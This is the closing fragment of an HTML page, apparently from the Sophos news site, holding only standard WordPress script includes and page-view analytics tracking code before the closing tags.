<script type='text/javascript' src='https://news.sophos.com/_static/??-eJyVkMEOwiAMhl9IYCxuxoPxUQyyurFRIJQ5fXsxyxIPHkbSS/9+X5tULIFp7xK4JNIACCTIh8GTg4VYXcmTGClXhvxkgD1rXnOZA74GfKSD2LVD+1hAwytFRfv5NeJzMrbc0gqDMr0rFoOKyUEs9npVrHyzTTJO27kDWt+KmBewCMG+ORr3D8ot4B263/l2GWcW7NwbR0JNhhCSuGVXPHzEzF7xIlvZHNuqkefxA21LyhQ='></script>
<script src='https://stats.wp.com/e-202112.js' defer></script>
<script>
	_stq = window._stq || [];
	_stq.push([ 'view', {v:'ext',j:'1:9.5.2',blog:'166161023',post:'60589',tz:'-4',srv:'news.sophos.com'} ]);
	_stq.push([ 'clickTrackerInit', '166161023', '60589' ]);
</script>
</body>
</html>
